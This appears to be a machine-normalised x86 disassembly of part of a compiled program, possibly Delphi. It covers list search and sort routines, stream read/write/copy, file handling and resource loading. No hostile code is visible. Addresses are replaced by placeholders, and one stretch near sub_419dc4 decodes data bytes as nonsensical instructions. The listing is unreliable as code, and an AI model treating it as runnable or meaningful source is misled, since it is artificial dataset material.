mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_418ec4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_418f3c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_418174
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_40408c
pop edi
pop esi
pop ebx
retn
sub_418f78
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_418174
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_418fa0
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_418fd4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_4184c8
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_419020
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_418174
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_418174
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_419074
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_418fa0
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_40408c
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_402968
sub_4190ec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_418174
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_418174
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_40408c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_419148
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_418174
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_419188
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418ea0
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_419188
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_419238
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_419294
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_419188
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_4192e8
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41931c
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_419380
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_4193d4
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403238
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
call sub_403a74
mov esp ebp
pop ebp
retn
sub_419420
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_403230
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_4193d4
pop ecx
mov eax [ ebx ]
call sub_403274
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_4193d4
pop ecx
sub_4194a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_419514
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
sub_41954c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
sub_419584
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_419308
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_40276c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_419660
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419667
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_40278c
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_419514
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41954c
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_419678
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419d4c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4196c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41bd80
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4196cf
mov eax [ ebp - 0x8 ]
call sub_4032e8
retn
sub_4196d8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032b8
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_419734
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_408634
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_419774
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40cccc
pop ebx
pop ebp
retn 0x8
sub_41979c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_4197e0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4197e0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_419909
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_40360c
movzx edx di
mov eax esi
call sub_408558
mov ecx eax
xor edx edx
mov eax ebx
call sub_4196d8
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_4085d4
mov ecx eax
xor edx edx
mov eax ebx
call sub_4196d8
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419910
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_40405c
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408774
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40afc4
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
call sub_403a74
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408774
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40afc4
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
call sub_403a74
jmp r-xdata
sub_419910
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_419934
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
call sub_40866c
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_419970
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_402968
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4199a8
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_4199cc
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_4199f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_419a10
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_419308
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_419514
sub_419a48
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_419968
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_419a70
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_419a48
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_419a9c
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406ccc
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406cb0
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406ca0
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
test ecx ecx
jne r-xdata
sub_419b28
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_402968
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_419a48
sub_419b78
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032b8
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_4044f8
mov ecx eax
mov edx esi
mov eax edi
call sub_419c90
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_419bd0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032b8
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx esi
mov eax edi
call sub_419c90
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_419c20
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_419c83
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419c8a
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_419c90
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_419c20
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_419968
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_419c20
pop ecx
sub_419cfc
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406c9c
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_419d4c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_40276c
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_419d94
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_40278c
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_419dc4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ esi + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub bl [ esi + 0x180041 ]
add [ eax ] al
and [ ecx ] dl
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ eax ] bh
lahf
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
in al 0x10
inc eax
add [ eax + eax ] dl
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
fdiv [ edx ]
inc eax
add [ eax - 0x61 ] cl
inc ecx
add [ esi ] cl
push esp
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
test [ esi + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ esi + 0x180041 ] bl
add [ eax ] al
rcr [ ebp + 0x35300041 ] 0x40
add [ esi + 0x35400040 ] bh
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404128
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404598
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_40408c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_40408c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419e98
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
